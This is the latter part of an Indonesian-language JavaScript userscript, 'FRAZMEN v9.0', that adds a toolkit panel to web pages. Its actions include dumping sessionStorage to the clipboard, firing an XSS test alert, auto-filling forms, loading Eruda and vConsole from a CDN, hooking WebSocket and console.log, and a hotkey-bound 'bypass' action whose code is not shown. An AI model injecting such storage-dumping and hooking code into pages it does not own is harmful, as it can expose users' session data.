                Toast.show('🗄️ localStorage kosong.', 'warning');
            }
        },

        _actionSSDump: function() {
            var data = '';
            for(var k in sessionStorage) {
                if(sessionStorage.hasOwnProperty(k)) {
                    data += k+' : '+sessionStorage[k]+'\n';
                }
            }
            if(data) {
                navigator.clipboard.writeText(data).then(function() {
                    Toast.show('📋 sessionStorage disalin!', 'success');
                }).catch(function() {
                    alert('📋 sessionStorage:\n\n'+data);
                });
            } else {
                Toast.show('📋 sessionStorage kosong.', 'warning');
            }
        },

        _actionXSS: function() {
            alert('⚡ XSS Test: '+document.domain);
            alert('🔥 XSS Triggered!');
            Toast.show('⚡ XSS Test executed!', 'hack');
        },

        _actionAutoFill: function() {
            var inputs = document.querySelectorAll('input, textarea, select');
            var filled = 0;
            inputs.forEach(function(el) {
                var type = el.type || el.tagName;
                if(type === 'text' || type === 'email' || type === 'password' || type === 'search' || type === 'tel' || type === 'textarea') {
                    el.value = 'test_'+Math.random().toString(36).slice(2,8);
                    filled++;
                } else if(type === 'checkbox' || type === 'radio') {
                    el.checked = true;
                    filled++;
                } else if(el.tagName === 'SELECT' && el.options.length > 0) {
                    el.selectedIndex = Math.floor(Math.random() * el.options.length);
                    filled++;
                } else if(type === 'number') {
                    el.value = Math.floor(Math.random() * 100) + 1;
                    filled++;
                } else if(type === 'date') {
                    var d = new Date();
                    d.setDate(d.getDate() + Math.floor(Math.random() * 30));
                    el.value = d.toISOString().split('T')[0];
                    filled++;
                }
            });
            Toast.show('✏️ '+filled+' field terisi!', 'success');
        },

        _actionDarkMode: function() {
            var current = document.body.style.filter;
            if(current === 'invert(1)') {
                document.body.style.filter = 'invert(0)';
                document.body.style.background = '';
            } else {
                document.body.style.filter = 'invert(1)';
                document.body.style.background = '#fff';
            }
            Toast.show('🌙 Dark mode toggled!', 'info');
        },

        _actionNetwork: function() {
            Toast.show('🌐 Buka DevTools -> Network tab', 'info');
        },

        _actionScreenshot: function() {
            Toast.show('📸 Screenshot: Volume Down+Power / Print Screen', 'info');
        },

        _actionEruda: function() {
            if(window.eruda) {
                window.eruda.init();
                Toast.show('🐞 Eruda loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/eruda';
            s.onload = function() { if(window.eruda) { eruda.init(); Toast.show('🐞 Eruda loaded!', 'success'); } };
            document.head.appendChild(s);
        },

        _actionVConsole: function() {
            if(window.VConsole) {
                new VConsole();
                Toast.show('📱 vConsole loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/vconsole';
            s.onload = function() { if(window.VConsole) { new VConsole(); Toast.show('📱 vConsole loaded!', 'success'); } };
            document.head.appendChild(s);
        },

        _actionClear: function() {
            localStorage.clear();
            sessionStorage.clear();
            Toast.show('🧹 All storage cleared!', 'success');
        },

        _actionPing: function() {
            var start = Date.now();
            fetch(window.location.href, { mode: 'no-cors', cache: 'no-store' })
                .then(function() { Toast.show('📶 Ping: '+(Date.now()-start)+'ms', 'info'); })
                .catch(function() { Toast.show('📶 Ping: timeout', 'error'); });
        },

        _actionWhois: function() {
            var domain = prompt('🔍 Masukkan domain:', window.location.hostname);
            if(domain) {
                Toast.show('🔍 Whois untuk '+domain+' — buka tab baru', 'info');
                window.open('https://who.is/whois/'+domain, '_blank');
            }
        },

        _actionBase64: function() {
            var choice = confirm('🔐 Encode? (OK=Encode, Cancel=Decode)');
            var input = prompt('Masukkan teks:');
            if(input !== null && input !== '') {
                try {
                    var result = choice ? btoa(input) : atob(input);
                    navigator.clipboard.writeText(result).then(function() {
                        Toast.show('🔐 Hasil disalin!', 'success');
                    }).catch(function() {
                        alert('🔐 Hasil:\n\n'+result);
                    });
                } catch(e) {
                    Toast.show('❌ Error: '+e.message, 'error');
                }
            }
        },

        _actionUUID: function() {
            var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            navigator.clipboard.writeText(uuid).then(function() {
                Toast.show('🆔 UUID disalin!', 'success');
            }).catch(function() {
                alert('🆔 UUID:\n\n'+uuid);
            });
        },

        _actionTimestamp: function() {
            var now = Date.now();
            navigator.clipboard.writeText(String(now)).then(function() {
                Toast.show('⏰ Timestamp disalin!', 'success');
            }).catch(function() {
                alert('⏰ Timestamp:\n\n'+now);
            });
        },

        _actionWebSocket: function() {
            var origWS = window.WebSocket;
            window.WebSocket = function(url, protocols) {
                var ws = new origWS(url, protocols);
                Toast.show('📡 WS connected: '+url, 'info');
                ws.addEventListener('message', function(e) {
                    var msg = typeof e.data === 'string' ? e.data.substring(0, 100) : '[Binary]';
                    Toast.show('📡 WS: '+msg, 'info');
                });
                return ws;
            };
            Toast.show('📡 WebSocket Monitor active!', 'success');
        },

        _actionHistory: function() {
            var history = STATE.consoleHistory || [];
            if(!history.length) {
                Toast.show('📝 Belum ada riwayat.', 'warning');
                return;
            }
            var output = '📝 Console History:\n\n';
            for(var i=0; i<Math.min(history.length, 30); i++) {
                output += (i+1) + '. ' + history[i] + '\n';
            }
            navigator.clipboard.writeText(output).then(function() {
                Toast.show('📝 Riwayat disalin!', 'success');
            }).catch(function() {
                alert('📝 Riwayat:\n\n'+output);
            });
        },

        _actionReload: function() {
            location.reload();
        },

        _bindEvents: function() {
            var origLog = console.log;
            console.log = function() {
                var args = Array.from(arguments);
                STATE.consoleHistory.push(args.map(function(a) {
                    return typeof a === 'object' ? JSON.stringify(a) : String(a);
                }).join(' '));
                if(STATE.consoleHistory.length > 1000) STATE.consoleHistory.shift();
                origLog.apply(console, arguments);
            };

            document.addEventListener('keydown', function(e) {
                if(e.ctrlKey && e.key === 'b') {
                    e.preventDefault();
                    this._triggerAction('bypass');
                }
                if(e.ctrlKey && e.key === 'e') {
                    e.preventDefault();
                    this._triggerAction('eruda');
                }
                if(e.ctrlKey && e.key === 'v') {
                    e.preventDefault();
                    this._triggerAction('vconsole');
                }
            }.bind(this));

            console.log('🔗 Events bound');
        }
    };

    // ============================================================
    // 6. INIT
    // ============================================================
    function init() {
        console.log('═══════════════════════════════════════════════');
        console.log('⚡ FRAZMEN v9.0 ULTIMATE — FULL FIX');
        console.log('Developer: FRAZMEN | Telegram: @rizkycuyy');
        console.log('═══════════════════════════════════════════════');

        Toast.init();
        Panel.init();

        window.FRAZMEN = {
            version: CONFIG.version,
            config: CONFIG,
            state: STATE,
            panel: Panel,
            toast: Toast
        };

        Toast.show('⚡ FRAZMEN v9.0 loaded!', 'success');
        console.log('⚡ FRAZMEN v9.0 loaded!');
    }

    if(document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        setTimeout(init, 100);
    }

    console.log('⚡ FRAZMEN v9.0 ULTIMATE EDITION');
    console.log('💡 Klik tombol ⚡ di kanan bawah untuk membuka menu.');

    setTimeout(function() {
        if(Panel && Panel.show) {
            Panel.show();
            Toast.show('⚡ FRAZMEN siap digunakan!', 'success');
        }
    }, 500);

})();
